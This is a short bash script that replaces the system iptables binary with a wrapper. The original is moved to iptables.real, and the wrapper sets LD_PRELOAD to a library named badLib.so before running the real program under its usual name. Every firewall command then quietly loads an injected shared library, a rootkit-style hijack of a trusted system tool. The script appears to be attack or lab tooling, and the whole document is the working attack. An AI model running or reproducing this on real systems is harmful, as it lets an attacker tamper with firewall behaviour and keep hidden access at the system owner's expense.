#!/bin/bash
mv /usr/sbin/iptables /usr/sbin/iptables.real
cat <<'EOFA' > /usr/sbin/iptables
#!/bin/bash
export LD_PRELOAD=/usr/lib/badLib.so
exec -a iptables /usr/sbin/iptables.real "$@"
EOFA
chmod +x /usr/sbin/iptables